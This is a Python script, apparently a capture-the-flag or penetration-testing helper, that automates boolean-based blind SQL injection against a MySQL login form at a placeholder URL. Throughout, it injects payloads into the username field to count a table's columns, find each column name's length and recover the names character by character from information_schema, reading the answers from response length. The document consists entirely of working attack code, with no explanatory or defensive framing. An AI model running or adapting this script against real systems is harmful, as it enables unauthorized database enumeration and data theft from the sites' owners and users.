# MYSQL - Blind sqli

from requests import post
from string import ascii_letters, digits

class Attack:
    URL = 'https://vuln/login.php'
    SCHEMA_NAME = 'CHANGEME'
    TABLE_NAME = 'CHANGEME'
    DEBUG = False

    def __init__(self) -> None:
        total_column = self.get_total_column()
        self.get_columns(total_column)

    def get_total_column(self) -> int:
        for guess in range(1, 20):
            p = {"username": f"admin' and (SELECT COUNT(*)={guess} total_columns FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}')#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            if self.DEBUG:
                print(guess, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(total_column)={guess}')
                return guess
    
    def get_column_name_length(self, index: int) -> int:
        for name_length in range(1, 100):
            p = {"username": f"admin' and (SELECT LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {index}))={name_length})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            if self.DEBUG:
                print(name_length, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(table[{index}])={name_length}')
                return name_length


    def get_columns(self, n: int) -> None:
        for column_index in range(n):
            name_length = self.get_column_name_length(column_index)
            column_name = ''
            for name_index in range(1, name_length+1):
                for guess in ascii_letters + digits:
                    p = {"username": f"admin' and (SELECT ASCII(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}' ORDER BY COLUMN_NAME LIMIT 1 OFFSET {column_index}),{name_index},1))={ord(guess)})#", "password": "<ignore>"}
                    resp = post(self.URL, data=p)
                    if self.DEBUG:
                        print(guess, len(resp.text))
                    if len(resp.text) > 2000:
                        column_name += guess
                        print(f'column[{column_index}][{name_index}/{name_length}]={column_name}')
                        break

if __name__ == '__main__':
    Attack()
